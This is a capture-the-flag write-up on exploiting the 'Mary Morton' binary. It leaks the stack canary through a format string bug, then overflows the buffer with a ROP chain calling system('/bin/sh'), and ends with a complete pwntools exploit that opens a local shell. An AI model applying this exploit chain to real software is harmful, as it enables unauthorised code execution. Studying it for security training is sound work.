# Mary Morton

So after we download and extract the file, we have a binary. Let's take a look at the binary (also one thing, I slightly modified this binary, but we'll cover that in more detail later):

```
$    file mary_morton
mary_morton: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b7971b84c2309bdb896e6e39073303fc13668a38, stripped
$    pwn checksec mary_morton
[*] '/Hackery/asis/mary/mary_morton'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

So we see that it is a 64 bit Elf, with a stack canary and non executable stack. Let's see what happens when we run the binary:

```
$    ./mary_morton
Welcome to the battle !
[Great Fairy] level pwned
Select your weapon
1. Stack Bufferoverflow Bug
2. Format String Bug
3. Exit the battle
2
%x.%x.%x.%x.%x
c743ca40.7f.14b4a890.0.0
1. Stack Bufferoverflow Bug
2. Format String Bug
3. Exit the battle
Alarm clock
```

So we see we are given a prompt for a Buffer Overflow, format string, or just to exit the battle. We confirmed that the format string bug indeed works with the `%x` flags. We can also that there is an alarm feature which will kill the program after a set amount of time. We can run it in gdb, that way when the Alarm Clock triggers it won't kill the program.

```
gef➤  r
Starting program: /Hackery/pod/modules/ret_2_system/asis17_marymorton/mary_morton 
Welcome to the battle ! 
[Great Fairy] level pwned 
Select your weapon 
1. Stack Bufferoverflow Bug 
2. Format String Bug 
3. Exit the battle 
1
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
-> 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
�;U���7P
@
*** stack smashing detected ***: <unknown> terminated
```

So we also verified that the buffer overflow bug is legit. Let's take a look at the binary in Ghidra.

## Reversing

Looking through the list of functions in Ghidra, we find this one at `0x400826`:

```

void menu(void)

{
  int choice;
  
  FUN_004009ff();
  puts("Welcome to the battle ! ");
  puts("[Great Fairy] level pwned ");
  puts("Select your weapon ");
  while( true ) {
    while( true ) {
      printMenu();
      __isoc99_scanf(&DAT_00400b1c,&choice);
      if (choice != 2) break;
      fmtBug();
    }
    if (choice == 3) break;
    if (choice == 1) {
      overflowBug();
    }
    else {
      puts("Wrong!");
    }
  }
  puts("Bye ");
                    /* WARNING: Subroutine does not return */
  exit(0);
}

```

So we can see here the function prints out the starting prompt, then enters into a loop where it will print out the menu options, then scan in input. Based upon the input, it will either trigger the `fmtBug` function, `overflowBug` function, or just exit the program. Let's take a look at the `fmtBug` function.

```
void fmtBug(void)

{
  long i;
  undefined8 *inputCpy;
  long in_FS_OFFSET;
  undefined8 input [17];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  i = 0x10;
  inputCpy = input;
  while (i != 0) {
    i = i + -1;
    *inputCpy = 0;
    inputCpy = inputCpy + 1;
  }
  read(0,input,0x7f);
  printf((char *)input);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

So we can see here, it pretty much does what we expected. It first clears out a space of memory, then scans in input to that space (`0x7f` bytes). Proceeding that it prints it unformatted using `printf` to have a format string vulnerability. Let's take a look at the `overflowBug`:

```
void overflowBug(void)

{
  long i;
  undefined8 *inputCpy;
  long in_FS_OFFSET;
  undefined8 input [17];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  i = 0x10;
  inputCpy = input;
  while (i != 0) {
    i = i + -1;
    *inputCpy = 0;
    inputCpy = inputCpy + 1;
  }
  read(0,input,0x100);
  printf("-> %s\n",input);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Looking at this, we can see that it reads in `0x100` (`256`) bytes of data into the buffer that Ghidra says only has `17` bytes. Thing is, when we look at the stack layout we see that the buffer is bigger than that:

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined overflowBug()
             undefined         AL:1           <RETURN>
             long              RCX:8          i                                       XREF[1]:     00400986(W)  
             undefined8 *      RDI:8          inputCpy                                XREF[1]:     0040098e(W)  
             long              Stack[-0x10]:8 canary                                  XREF[2]:     00400974(W), 
                                                                                                   004009c4(R)  
             undefined8[17]    Stack[-0x98]   input                                   XREF[3]:     0040097a(*), 
                                                                                                   00400991(*), 
                                                                                                   004009aa(*)  
                             overflowBug                                     XREF[3]:     menu:004008a7(c), 00400bc0, 
                                                                                          00400cc0(*)  
        00400960 55              PUSH       RBP
```
So we can see that `input` is at offset `-0x98`, and that `canary` is at offset `-0x10`. That gives us `0x98 - 0x10 = 0x88` byte offset. Since we can scan in `0x100` bytes this is is a buffer overflow bug. Also after it scans in the input, it prints the data you scanned in. So we should be able to use the buffer overflow vulnerability to pop a shell. However our first hurdle will be to defeat the stack canary.

## Exploitation

In order to reach the return address to gain code flow execution, we will have to write over the stack canary. Before we do that, we will need to leak the stack canary, so we can write over the stack canary with itself. That way when the stack canary is checked, everything will check out. We should be able to accomplish this using the format string exploit to leak an address. Also as a sidenote we could probably use the buffer overflow function to leak the stack canary, by overflowing up right up to the stack canary. Then when it prints out the input it leaks the stack canary. However the issue with that is that we would need to overwrite the null byte of the stack canary, and it would check the canary before we had a chance to correct it. So I went for using the format string bug to leak the canary. We can find the offset for the format string to the stack canary using gdb.

First set a breakpoint for the stack canary check in the `format_string_vuln` function, then run that function, then leak a bunch of 8 byte hex strings:
```
gef➤  b *0x40094a
Breakpoint 1 at 0x40094a
gef➤  r
Starting program: /Hackery/pod/modules/ret_2_system/asis17_marymorton/mary_morton 
Welcome to the battle ! 
[Great Fairy] level pwned 
Select your weapon 
1. Stack Bufferoverflow Bug 
2. Format String Bug 
3. Exit the battle 
2
%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.
7fffffffdda0.7f.7ffff7af4081.0.0.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c6c252e786c6c25.252e786c6c252e78.786c6c252e786c6c.6c252e786c6c252e.2e786c6c252e786c.6c252e786c6c25.0.217c6cddb9f90f00.7fffffffde70.4008b8.[ Legend: Modified register | Code | Heap | Stack | String ]
```

So a stack canary for 64 bit systems is an 8 byte hex string that ends in a null byte. Looking through the output, we can see such a hex string at offset 23 with `217c6cddb9f90f00`. We can confirm that this is the stack canary once we reach the breakpoint by examining the value of `rbp-0x8`, since from the source code we can see  that is where the canary is:

```
Breakpoint 1, 0x000000000040094a in ?? ()
gef➤  lx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.%llx.
Undefined command: "lx".  Try "help".
gef➤  x/4g $rbp-0x8
0x7fffffffde28: 0x217c6cddb9f90f00  0x7fffffffde70
0x7fffffffde38: 0x4008b8  0x7ffff7de59a0
gef➤  i f
Stack level 0, frame at 0x7fffffffde40:
 rip = 0x40094a; saved rip = 0x4008b8
 called by frame at 0x7fffffffde80
 Arglist at 0x7fffffffdd98, args: 
 Locals at 0x7fffffffdd98, Previous frame's sp is 0x7fffffffde40
 Saved registers:
  rbp at 0x7fffffffde30, rip at 0x7fffffffde38
```

So we can see that it is indeed the stack canary, which is at offset 23. We can also see that the offset between the stack canary and the rip register is `16`, so after the canary we will need to have an 8 byte offset before we hit the return address.

The next thing we will need to deal with is the Non-Executable stack. Since it is Non-Executable, we can't simply push shellcode onto the stack and execute it, so we will need to use ROP in order to execute code. Looking at the imports in Ghidra (`Imports>EXTERNAL`), we can see that system is in there. So we should be able to call system using it's `plt` address. First we need to find it, which can be accomplished by using objdump:

```
objdump -D mary_morton | grep system
00000000004006a0 <system@plt>:
  4008e3:    e8 b8 fd ff ff           callq  4006a0 <system@plt>
```

So the address of system is `0x4006a0`. The next thing that we will need is a ROP gadget which will pop an argument into a register for system, then return to call it. We can accomplish this by using ROPgadget:

```
$    ROPgadget --binary mary_morton | less
```

Looking through the list of ROPgadgets, we can see one that will accomplish the job:

```
0x0000000000400ab3 : pop rdi ; ret
```

So we have a ROPgadget, and the address of system which we can call. The only thing left to get is the argument for the `system` function. Originally when I was trying to solve it, I tried to get a pointer to `"/bin/sh"` and use that as an argument, until I found a much easier way specific to this challenge using gdb:

First set a breakpoint for anywhere in the program, then hit it

```
gef➤  b *0x400826
Breakpoint 1 at 0x400826
gef➤  r
Starting program: /Hackery/pod/modules/ret_2_system/asis17_marymorton/mary_morton 
```

then once you reach the breakpoint:

```
Breakpoint 1, 0x0000000000400826 in ?? ()
gef➤  find /bin/sh
Invalid size granularity.
gef➤  search-pattern /bin/sh
[+] Searching '/bin/sh' in memory
[+] In '/Hackery/pod/modules/ret_2_system/asis17_marymorton/mary_morton'(0x400000-0x401000), permission=r-x
  0x400b2b - 0x400b32  →   "/bin/sh" 
[+] In '/Hackery/pod/modules/ret_2_system/asis17_marymorton/mary_morton'(0x600000-0x601000), permission=r--
  0x600b2b - 0x600b32  →   "/bin/sh" 
[+] In '/lib/x86_64-linux-gnu/libc-2.27.so'(0x7ffff79e4000-0x7ffff7bcb000), permission=r-x
  0x7ffff7b97e9a - 0x7ffff7b97ea1  →   "/bin/sh" 
=
```

We can see here that the binary has the string `"/bin/sh"` is hardcoded at `0x400b2b`. This is the part of the binary that I modified. Originally it held the string `"/bin/cat ./flag"` which would print out the contents of the flag, so we would solve the challenge. However I decided to chaneg the string to give us a shell instead of just simply printing the flag. We should be able to use that as the argument for system. 

## Exploit

With all of those things, we can write the python exploit:

```
#First import pwntools
from pwn import *

#Establish the target process
target = process('./mary_morton_patched')
gdb.attach(target, gdbscript='b *0x4009a5')

raw_input()

#Establish the address for the ROP chain
gadget0 = 0x400ab3
cat_adr = 0x400b2b
sys_adr = 0x4006a0

#Recieve and print out the opening text
print target.recvuntil("Exit the battle")

#Execute the format string exploit to leak the stack canary
target.sendline("2")
target.sendline("%23$llx")
target.recvline()
canary = target.recvline()
canary = int(canary, 16)
print "canary: " + hex(canary)
print target.recvuntil("Exit the battle")

#Put the Rop chain together, and send it to the server to exploit it
target.sendline("1")
payload = "0"*136 + p64(canary) + "1"*8 + p64(gadget0) + p64(cat_adr) + p64(sys_adr)
target.send(payload)

#Drop to an interactive shell
target.interactive()
```

When we run the exploit:

```
[+] Starting local process './mary_morton_patched': pid 1719
[*] running in new terminal: /usr/bin/gdb -q  "./mary_morton_patched" 1719 -x "/tmp/pwnhoGB4g.gdb"
[+] Waiting for debugger: Done

Welcome to the battle !
[Great Fairy] level pwned
Select your weapon
1. Stack Bufferoverflow Bug
2. Format String Bug
3. Exit the battle
canary: 0x3d2b93f37b9ad900
1. Stack Bufferoverflow Bug
2. Format String Bug
3. Exit the battle
[*] Switching to interactive mode

-> 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
$ w
 18:29:13 up  2:48,  1 user,  load average: 0.10, 0.06, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
vagrant  pts/0    10.0.2.2         18:25    0.00s  0.29s  0.00s tmux
[*]
```

Just like that, we popped a shell!
